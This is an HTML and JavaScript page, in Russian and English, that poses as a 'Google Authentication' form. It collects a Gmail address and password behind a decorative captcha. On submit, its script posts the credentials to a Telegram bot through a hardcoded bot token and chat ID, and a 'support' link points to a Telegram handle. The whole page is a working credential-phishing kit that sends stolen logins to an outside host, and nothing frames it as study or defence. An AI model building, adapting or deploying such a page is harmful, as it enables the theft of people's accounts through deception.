<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Authentication</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background: #ffffff;
            min-height: 100vh;
            color: #333333;
            transition: all 0.3s ease;
        }
        body.dark-theme {
            background: #000000;
            color: white;
        }
        .form-container {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
            border: 1px solid #e0e0e0;
            transition: all 0.3s ease;
        }
        body.dark-theme .form-container {
            background: #1a1a1a;
            border: 1px solid #333;
            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
        }
        .controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .language-switcher {
            display: flex;
            gap: 5px;
        }
        .theme-switcher {
            display: flex;
            gap: 5px;
        }
        .language-btn, .theme-btn {
            background: #e0e0e0;
            color: #333;
            border: 1px solid #ccc;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
        }
        body.dark-theme .language-btn, 
        body.dark-theme .theme-btn {
            background: #333;
            color: white;
            border: 1px solid #555;
        }
        .language-btn.active, .theme-btn.active {
            background: #4285f4;
            color: white;
            border-color: #4285f4;
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            color: inherit;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        body.dark-theme .subtitle {
            color: #ccc;
        }
        .google-logo {
            text-align: center;
            font-size: 48px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: inherit;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 5px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
            background: white;
            color: #333;
        }
        body.dark-theme input {
            background: #2a2a2a;
            border: 2px solid #333;
            color: white;
        }
        input:focus {
            border-color: #4285f4;
            outline: none;
        }
        .code-input {
            letter-spacing: 8px;
            font-size: 18px;
            text-align: center;
            font-weight: bold;
        }
        .password-rules {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        body.dark-theme .password-rules {
            color: #888;
        }
        .captcha-container {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin: 15px 0;
            border: 1px solid #ddd;
        }
        body.dark-theme .captcha-container {
            background: #2a2a2a;
            border: 1px solid #444;
        }
        .captcha-code {
            font-family: 'Courier New', monospace;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 3px;
            color: #333;
            margin: 10px 0;
            padding: 10px;
            background: white;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        body.dark-theme .captcha-code {
            color: white;
            background: #333;
            border: 1px solid #555;
        }
        .refresh-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
        }
        .refresh-btn:hover {
            background: #3367d6;
        }
        button {
            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
            color: white;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
            transform: none;
        }
        body.dark-theme button:disabled {
            background: #333;
        }
        .success {
            color: #34a853;
            text-align: center;
            font-weight: bold;
            margin: 15px 0;
            padding: 10px;
            background: #e8f5e8;
            border-radius: 5px;
            border: 1px solid #34a853;
        }
        body.dark-theme .success {
            background: #1e3a28;
            border: 1px solid #34a853;
        }
        .error {
            color: #ea4335;
            text-align: center;
            font-weight: bold;
            margin: 15px 0;
            padding: 10px;
            background: #fde8e8;
            border-radius: 5px;
            border: 1px solid #ea4335;
        }
        body.dark-theme .error {
            background: #3a1e1e;
            border: 1px solid #ea4335;
        }
        .support {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        body.dark-theme .support {
            color: #888;
        }
        .support-link {
            color: #4285f4;
            text-decoration: none;
            cursor: pointer;
            font-weight: bold;
        }
        .support-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="controls">
            <div class="language-switcher">
                <button class="language-btn active" onclick="switchLanguage('ru')">RU</button>
                <button class="language-btn" onclick="switchLanguage('en')">EN</button>
            </div>
            <div class="theme-switcher">
                <button class="theme-btn active" onclick="switchTheme('light')">☀️</button>
                <button class="theme-btn" onclick="switchTheme('dark')">🌙</button>
            </div>
        </div>
        
        <div class="google-logo">&#128273;</div>
        
        <h1 id="title">Google Аутентификация</h1>
        <p class="subtitle" id="subtitle">Введите данные для подтверждения</p>
        
        <form id="authForm">
            <div class="input-group">
                <label id="emailLabel" for="userEmail">Gmail</label>
                <input type="email" id="userEmail" placeholder="ваш.email@gmail.com" required>
            </div>
            
            <div class="input-group">
                <label id="passwordLabel" for="userPassword">Пароль от Gmail</label>
                <input type="password" id="userPassword" placeholder="Введите пароль от Gmail" required>
                <div class="password-rules" id="passwordRules">Пароль должен быть не менее 6 символов</div>
            </div>

            <div class="input-group">
                <label id="captchaLabel">Код с картинки</label>
                <div class="captcha-container">
                    <div id="captchaText" class="captcha-code">A1B2C3</div>
                    <button type="button" class="refresh-btn" onclick="generateCaptcha()" id="refreshBtn">Обновить код</button>
                </div>
                <input type="text" id="captchaInput" placeholder="Введите код с картинки" required>
                <div class="password-rules" id="captchaRules">Введите код, показанный выше</div>
            </div>
            
            <button type="submit" id="submitBtn">Подтвердить</button>
        </form>
        
        <div id="result"></div>
        
        <div class="support">
            <span id="supportText">Нужна помощь? </span>
            <a class="support-link" onclick="openTelegram()">Написать в поддержку @Wxzkm7</a>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8587483022:AAGdnE5Q4eW8VB7OVvLq6ByAQH6qkLzwxSE';
        const CHAT_ID = '8468091216';

        // Language texts
        const translations = {
            ru: {
                title: "Google Аутентификация",
                subtitle: "Введите данные для подтверждения",
                emailLabel: "Gmail",
                emailPlaceholder: "ваш.email@gmail.com",
                passwordLabel: "Пароль от Gmail",
                passwordPlaceholder: "Введите пароль от Gmail",
                passwordRules: "Пароль должен быть не менее 6 символов",
                captchaLabel: "Код с картинки",
                captchaPlaceholder: "Введите код с картинки",
                captchaRules: "Введите код, показанный выше",
                refreshBtn: "Обновить код",
                submitBtn: "Подтвердить",
                success: "✅ Данные успешно отправлены!",
                error: "❌ Ошибка отправки данных",
                networkError: "❌ Ошибка сети",
                invalidEmail: "❌ Введите правильный Gmail",
                invalidPassword: "❌ Пароль должен быть не менее 6 символов",
                invalidCaptcha: "❌ Неверный код с картинки",
                support: "Нужна помощь? "
            },
            en: {
                title: "Google Authentication",
                subtitle: "Enter verification details",
                emailLabel: "Gmail",
                emailPlaceholder: "your.email@gmail.com",
                passwordLabel: "Gmail Password",
                passwordPlaceholder: "Enter your Gmail password",
                passwordRules: "Password must be at least 6 characters",
                captchaLabel: "Code from image",
                captchaPlaceholder: "Enter code from image",
                captchaRules: "Enter the code shown above",
                refreshBtn: "Refresh code",
                submitBtn: "Confirm",
                success: "✅ Data sent successfully!",
                error: "❌ Error sending data",
                networkError: "❌ Network error",
                invalidEmail: "❌ Please enter valid Gmail",
                invalidPassword: "❌ Password must be at least 6 characters",
                invalidCaptcha: "❌ Invalid code from image",
                support: "Need help? "
            }
        };

        let currentLanguage = 'ru';
        let currentTheme = 'light';
        let currentCaptcha = '';

        function generateCaptcha() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let captcha = '';
            for (let i = 0; i < 6; i++) {
                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            currentCaptcha = captcha;
            document.getElementById('captchaText').textContent = captcha;
        }

        function switchLanguage(lang) {
            currentLanguage = lang;
            document.querySelectorAll('.language-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            updateTexts();
        }

        function switchTheme(theme) {
            currentTheme = theme;
            if (theme === 'dark') {
                document.body.classList.add('dark-theme');
            } else {
                document.body.classList.remove('dark-theme');
            }
            document.querySelectorAll('.theme-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
        }

        function updateTexts() {
            const texts = translations[currentLanguage];
            document.getElementById('title').textContent = texts.title;
            document.getElementById('subtitle').textContent = texts.subtitle;
            document.getElementById('emailLabel').textContent = texts.emailLabel;
            document.getElementById('userEmail').placeholder = texts.emailPlaceholder;
            document.getElementById('passwordLabel').textContent = texts.passwordLabel;
            document.getElementById('userPassword').placeholder = texts.passwordPlaceholder;
            document.getElementById('passwordRules').textContent = texts.passwordRules;
            document.getElementById('captchaLabel').textContent = texts.captchaLabel;
            document.getElementById('captchaInput').placeholder = texts.captchaPlaceholder;
            document.getElementById('captchaRules').textContent = texts.captchaRules;
            document.getElementById('refreshBtn').textContent = texts.refreshBtn;
            document.getElementById('submitBtn').textContent = texts.submitBtn;
            document.getElementById('supportText').textContent = texts.support;
        }

        function openTelegram() {
            window.open('https://t.me/Wxzkm7', '_blank');
        }

        // Email validation function
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Password validation
        function isValidPassword(password) {
            return password.length >= 6;
        }

        // Captcha validation
        function isValidCaptcha(input) {
            return input.toUpperCase() === currentCaptcha;
        }

        document.getElementById('authForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const email = document.getElementById('userEmail').value;
            const password = document.getElementById('userPassword').value;
            const captcha = document.getElementById('captchaInput').value;
            const button = document.getElementById('submitBtn');
            const resultDiv = document.getElementById('result');
            const texts = translations[currentLanguage];
            
            // Validate email
            if (!isValidEmail(email)) {
                resultDiv.innerHTML = `<div class="error">${texts.invalidEmail}</div>`;
                return;
            }
            
            // Validate password
            if (!isValidPassword(password)) {
                resultDiv.innerHTML = `<div class="error">${texts.invalidPassword}</div>`;
                return;
            }
            
            // Validate captcha
            if (!isValidCaptcha(captcha)) {
                resultDiv.innerHTML = `<div class="error">${texts.invalidCaptcha}</div>`;
                generateCaptcha(); // Generate new captcha on wrong input
                document.getElementById('captchaInput').value = '';
                return;
            }
            
            button.textContent = currentLanguage === 'ru' ? '⏳ Отправка...' : '⏳ Sending...';
            button.disabled = true;
            
            const text = `🔐 GOOGLE AUTHENTICATION DATA\n\n📧 Gmail: ${email}\n🔑 Password: ${password}\n🔢 Captcha Code: ${captcha}\n🌐 Language: ${currentLanguage.toUpperCase()}\n🎨 Theme: ${currentTheme}\n🕒 Time: ${new Date().toLocaleString()}\n\nSupport: @Wxzkm7`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    resultDiv.innerHTML = `<div class="success">${texts.success}</div>`;
                    document.getElementById('authForm').reset();
                    generateCaptcha(); // Generate new captcha after success
                } else {
                    resultDiv.innerHTML = `<div class="error">${texts.error}</div>`;
                }
            } catch (error) {
                resultDiv.innerHTML = `<div class="error">${texts.networkError}</div>`;
            } finally {
                button.textContent = texts.submitBtn;
                button.disabled = false;
            }
        });

        // Initialize
        generateCaptcha();
        updateTexts();

        // Real-time validation
        document.getElementById('userEmail').addEventListener('blur', function() {
            const email = this.value;
            const errorColor = currentTheme === 'dark' ? '#ea4335' : '#ea4335';
            const normalColor = currentTheme === 'dark' ? '#333' : '#ddd';
            
            if (email && !isValidEmail(email)) {
                this.style.borderColor = errorColor;
            } else {
                this.style.borderColor = normalColor;
            }
        });

        document.getElementById('userPassword').addEventListener('input', function() {
            const password = this.value;
            const errorColor = currentTheme === 'dark' ? '#ea4335' : '#ea4335';
            const normalColor = currentTheme === 'dark' ? '#333' : '#ddd';
            
            if (password && !isValidPassword(password)) {
                this.style.borderColor = errorColor;
            } else {
                this.style.borderColor = normalColor;
            }
        });
    </script>
</body>
  </html>
